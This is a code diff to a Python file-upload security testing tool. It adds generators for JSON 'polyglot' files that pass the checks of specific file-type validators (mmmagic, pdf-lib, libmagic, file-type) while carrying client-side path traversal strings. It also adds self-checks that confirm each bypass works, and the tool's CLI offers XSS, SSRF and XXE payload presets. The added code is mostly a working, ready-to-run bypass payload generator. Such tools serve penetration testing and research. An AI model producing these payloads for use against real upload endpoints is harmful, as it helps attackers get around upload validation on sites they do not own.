@@ -5,6 +5,7 @@ import argparse
 import binascii
 import codecs
 import io
+import json
 import os
 import platform
 import struct
@@ -31,7 +32,7 @@ BANNER = r"""[bold cyan]
 
         File Upload Security Tester | by bytewreaker
 [/bold cyan]
-[dim]  CSV · JPEG · PNG · GIF · WebP · PDF · SVG · TIFF · BMP · ICO · EICAR[/dim]
+[dim]  CSV · JPEG · PNG · GIF · WebP · PDF · SVG · TIFF · BMP · ICO · EICAR · CSPT[/dim]
 """
 
 # ─────────────────────────────────────────
@@ -251,7 +252,6 @@ def make_tiff(file_path, text="UploadProbe", payload=None):
     image = _base_image(text)
     save_kwargs = {"format": "tiff"}
     if payload:
-        # TIFF supports embedding metadata via tag 270 (ImageDescription)
         exif_data = image.getexif()
         exif_data[270] = payload  # 270 = ImageDescription tag
         save_kwargs["exif"] = exif_data.tobytes()
@@ -270,7 +270,6 @@ def make_bmp(file_path, text="UploadProbe", payload=None):
     bmp_data = buf.getvalue()
 
     if payload:
-        # BMP has a reserved 4-byte field at offset 6-9 — safe to embed small payloads
         encoded = payload.encode('utf-8', errors='replace')[:4]
         encoded = encoded.ljust(4, b'\x00')
         bmp_data = bmp_data[:6] + encoded + bmp_data[10:]
@@ -285,7 +284,6 @@ def make_bmp(file_path, text="UploadProbe", payload=None):
 # ─────────────────────────────────────────
 
 def make_ico(file_path, text="UploadProbe", payload=None):
-    # ICO works best with power-of-2 sizes
     image = Image.new('RGB', (256, 256), (255, 255, 255))
     draw = ImageDraw.Draw(image)
     font = resolve_font(20)
@@ -296,8 +294,6 @@ def make_ico(file_path, text="UploadProbe", payload=None):
     ico_data = buf.getvalue()
 
     if payload:
-        # Append payload as a comment after the ICO binary
-        # Useful for testing if servers strip or reflect trailing data
         ico_data += b'\x00' + payload.encode('utf-8', errors='replace')
 
     with open(file_path, 'wb') as f:
@@ -343,6 +339,220 @@ def make_svg(file_path, text="UploadProbe", payload=None):
     with open(file_path, 'w') as f:
         f.write(svg)
     return True
+
+
+# ─────────────────────────────────────────
+#  CSPT JSON POLYGLOTS
+# ─────────────────────────────────────────
+#
+# These generate files that are simultaneously:
+#   (a) valid JSON, parseable by JSON.parse() client-side, and
+#   (b) accepted by a specific server-side file-type validator
+#       that only checks for a narrow signal (magic bytes, a
+#       fixed offset, or file structure) rather than the whole
+#       file being exclusively that format.
+#
+# Reference: Doyensec, "Bypassing File Upload Restrictions To
+# Exploit Client-Side Path Traversal" (Jan 2025).
+
+def make_cspt_mmmagic(file_path, traversal_path="../CSPT_PAYLOAD", extra=None):
+    obj = {"id": traversal_path, "%PDF": "1.4"}
+    if extra:
+        obj.update(extra)
+    data = json.dumps(obj, separators=(',', ':'))
+    if len(data.encode()) > 1024:
+        console.print("[yellow]Warning: payload exceeds mmmagic's 1024-byte scan window.[/yellow]")
+    with open(file_path, 'w') as f:
+        f.write(data)
+    return True
+
+
+def make_cspt_pdflib(file_path, traversal_path="../../../../CSPT?"):
+    pdf_body = (
+        "%PDF-1.3 1 0 obj << /Pages 2 0 R /Type /Catalog >> endobj "
+        "2 0 obj << /Count 1 /Kids [3 0 R] /Type /Pages >> endobj "
+        "3 0 obj << /Contents 4 0 R /MediaBox [0 0 200 200] /Parent 2 0 R "
+        "/Resources << /Font << /F1 5 0 R >> >> /Type /Page >> endobj "
+        "4 0 obj << /Length 50 >> stream BT /F1 10 Tf 20 100 Td (CSPT) Tj ET "
+        "endstream endobj 5 0 obj << /Type /Font /Subtype /Type1 "
+        "/BaseFont /Helvetica >> endobj xref 0 6 0000000000 65535 f "
+        "0000000009 00000 n 0000000062 00000 n 0000000133 00000 n "
+        "0000000277 00000 n 0000000370 00000 n trailer << /Size 6 "
+        "/Root 1 0 R >> startxref 447 %%EOF "
+    )
+    obj = {"_id": traversal_path, "bypass": pdf_body}
+    with open(file_path, 'w') as f:
+        f.write(json.dumps(obj, separators=(',', ':')))
+    return True
+
+
+def make_cspt_file_cmd(file_path, traversal_path="../../../../CSPT?", pad_bytes=1_100_000):
+    pdf_header = "%PDF-1.3 1 0 obj << /Pages 2 0 R /Type /Catalog >> endobj "
+    obj = {
+        "_id": traversal_path,
+        "bypass": pdf_header + (" " * pad_bytes)
+    }
+    with open(file_path, 'w') as f:
+        f.write(json.dumps(obj, separators=(',', ':')))
+    return True
+
+
+
+def make_cspt_webp_offset(file_path, traversal_path="../../../../CSPT?"):
+    """
+    Bypasses file-type-style libraries (e.g. sindresorhus/file-type)
+    that check for magic bytes at a fixed offset — 'WEBP' at byte
+    offset 8 for the RIFF/WEBP container. Key length is tuned so the
+    value string lands exactly at offset 8.
+
+    NOTE: must use compact separators (no spaces) — json.dumps'
+    default separators (', ', ': ') shift byte offsets and break
+    the offset-8 alignment this technique depends on.
+    """
+    obj = {"aaa": "WEBP", "_id": traversal_path}
+    data = json.dumps(obj, separators=(',', ':'))
+    if data[8:12] != "WEBP":
+        raise ValueError(f"Offset drifted — got {data[8:12]!r}, expected 'WEBP'. Adjust key.")
+    with open(file_path, 'w') as f:
+        f.write(data)
+    return True
+
+
+CSPT_TECHNIQUES = {
+    "mmmagic": make_cspt_mmmagic,
+    "pdflib":  make_cspt_pdflib,
+    "filecmd": make_cspt_file_cmd,
+    "webp":    make_cspt_webp_offset,
+}
+
+CSPT_META = {
+    "mmmagic": "Node mmmagic MIME sniff (magic bytes anywhere in first 1024B)",
+    "pdflib":  "pdf-lib structural PDF validation",
+    "filecmd": "`file` / libmagic CLI (JSON-parse fallback + byte-read limit)",
+    "webp":    "file-type / sindresorhus-style libs (fixed-offset magic bytes)",
+}
+
+def list_cspt_techniques():
+    table = Table(title="CSPT JSON Polyglot Techniques", style="cyan")
+    table.add_column("Name", style="bold yellow")
+    table.add_column("Bypasses", style="green")
+    for name in CSPT_TECHNIQUES:
+        table.add_row(name, CSPT_META[name])
+    console.print(table)
+
+
+# ─────────────────────────────────────────
+#  SELF-CHECK / VERIFICATION
+# ─────────────────────────────────────────
+#
+# For CSPT polyglots specifically, the whole exploit hinges on the
+# file staying valid JSON. This step re-parses each generated file
+# with the stdlib json module (mirroring JSON.parse in a browser) so
+# padding/offset mistakes are caught locally before you ever touch
+# a real target.
+
+def verify_json_polyglot(file_path):
+    """
+    Returns (ok: bool, detail: str).
+    ok=True means the file parses as valid JSON.
+    """
+    try:
+        with open(file_path, 'r', encoding='utf-8', errors='strict') as f:
+            raw = f.read()
+    except UnicodeDecodeError as e:
+        return False, f"not valid UTF-8: {e}"
+    except OSError as e:
+        return False, f"read error: {e}"
+
+    try:
+        json.loads(raw)
+    except json.JSONDecodeError as e:
+        return False, f"JSON parse error: {e.msg} (line {e.lineno}, col {e.colno})"
+
+    return True, "valid JSON"
+
+
+def verify_magic_offset(file_path, expected_bytes, offset):
+    """
+    Confirms that `expected_bytes` (e.g. b'WEBP') appear at the
+    given byte offset — useful for offset-dependent techniques.
+    """
+    try:
+        with open(file_path, 'rb') as f:
+            data = f.read()
+    except OSError as e:
+        return False, f"read error: {e}"
+
+    actual = data[offset:offset + len(expected_bytes)]
+    if actual == expected_bytes:
+        return True, f"{expected_bytes!r} found at offset {offset}"
+    return False, f"expected {expected_bytes!r} at offset {offset}, found {actual!r}"
+
+
+def verify_magic_present(file_path, expected_bytes, within_bytes=None):
+    """
+    Confirms that `expected_bytes` appear anywhere in the file,
+    optionally restricted to the first `within_bytes` bytes.
+    """
+    try:
+        with open(file_path, 'rb') as f:
+            data = f.read()
+    except OSError as e:
+        return False, f"read error: {e}"
+
+    window = data[:within_bytes] if within_bytes else data
+    if expected_bytes in window:
+        pos = window.find(expected_bytes)
+        return True, f"{expected_bytes!r} found at offset {pos}"
+    limit_note = f" within first {within_bytes} bytes" if within_bytes else ""
+    return False, f"{expected_bytes!r} not found{limit_note}"
+
+
+def run_cspt_self_check(technique_name, file_path):
+    """
+    Dispatches to the right verification(s) for a given CSPT
+    technique and returns a list of (label, ok, detail) tuples.
+    """
+    checks = []
+
+    ok, detail = verify_json_polyglot(file_path)
+    checks.append(("valid JSON", ok, detail))
+
+    if technique_name == "mmmagic":
+        ok, detail = verify_magic_present(file_path, b'%PDF', within_bytes=1024)
+        checks.append(("%PDF within 1024B", ok, detail))
+
+    elif technique_name == "pdflib":
+        ok, detail = verify_magic_present(file_path, b'%PDF')
+        checks.append(("%PDF present", ok, detail))
+        ok, detail = verify_magic_present(file_path, b'%%EOF')
+        checks.append(("%%EOF present", ok, detail))
+
+    elif technique_name == "filecmd":
+        size = os.path.getsize(file_path)
+        ok = size > 1_048_576
+        detail = f"{size} bytes ({'exceeds' if ok else 'BELOW'} libmagic's 1MB default read limit)"
+        checks.append(("padded past 1MB limit", ok, detail))
+
+    elif technique_name == "webp":
+        ok, detail = verify_magic_offset(file_path, b'WEBP', 8)
+        checks.append(("WEBP at offset 8", ok, detail))
+
+    return checks
+
+
+def print_self_check_results(technique_name, file_path, checks):
+    all_ok = all(ok for _, ok, _ in checks)
+    table = Table(title=f"Self-Check — {technique_name} ({file_path})",
+                  style="green" if all_ok else "red")
+    table.add_column("Check", style="bold")
+    table.add_column("Result")
+    table.add_column("Detail", style="dim")
+    for label, ok, detail in checks:
+        status = "[green]PASS[/green]" if ok else "[red]FAIL[/red]"
+        table.add_row(label, status, detail)
+    console.print(table)
+    return all_ok
 
 
 # ─────────────────────────────────────────
@@ -438,16 +648,55 @@ def parse_args():
     )
     parser.add_argument('-t', '--text',         default='UploadProbe',  help='Text rendered in image/PDF')
     parser.add_argument('-p', '--payload',       default=None,          help='Payload to embed in file metadata/structure')
-    parser.add_argument('-b', '--bytes',         default=None,          help='Target file size e.g. 10KB, 5MB (PNG only)')
+    parser.add_argument('-b', '--bytes',         default=None,          help='Target file size e.g. 10KB, 5MB (PNG/CSV only)')
     parser.add_argument('--preset', nargs='+', default=None,            help='One or more built-in presets e.g. --preset xss ssrf xxe')
     parser.add_argument('--list-presets',        action='store_true',   help='Show all built-in payload presets and exit')
     parser.add_argument('--all',                 default=None,          metavar='BASENAME',
                         help='Generate all formats at once.\nExample: --all test_upload')
 
+    parser.add_argument('--cspt', choices=list(CSPT_TECHNIQUES.keys()) + ['all'], default=None,
+                        help='Generate a CSPT JSON polyglot targeting a specific validator')
+    parser.add_argument('--cspt-path', default="../../../../CSPT?",
+                        help='Traversal string embedded as the JSON gadget payload')
+    parser.add_argument('--list-cspt', action='store_true',
+                        help='List CSPT polyglot techniques and exit')
+    parser.add_argument('--no-verify', action='store_true',
+                        help='Skip self-check verification after generating CSPT polyglots')
+
     args = parser.parse_args()
 
     if args.list_presets:
         list_presets()
+        return
+
+    if args.list_cspt:
+        list_cspt_techniques()
+        return
+
+    if args.cspt:
+        techniques = CSPT_TECHNIQUES if args.cspt == 'all' else {args.cspt: CSPT_TECHNIQUES[args.cspt]}
+        overall_ok = True
+        for name, fn in techniques.items():
+            out_path = f"cspt_{name}.json"
+            try:
+                fn(out_path, args.cspt_path)
+                console.print(f"[green]Generated[/green] {name} -> {out_path}")
+            except Exception as e:
+                console.print(f"[red]FAIL generating {name}: {e}[/red]")
+                overall_ok = False
+                continue
+
+            if not args.no_verify:
+                checks = run_cspt_self_check(name, out_path)
+                ok = print_self_check_results(name, out_path, checks)
+                overall_ok = overall_ok and ok
+
+        if overall_ok:
+            console.print(Panel("[green]All CSPT polyglots generated and verified successfully.[/green]",
+                                border_style="green"))
+        else:
+            console.print(Panel("[red]One or more CSPT polyglots failed generation or verification. "
+                                "Review the tables above.[/red]", border_style="red"))
         return
 
     payloads = {}
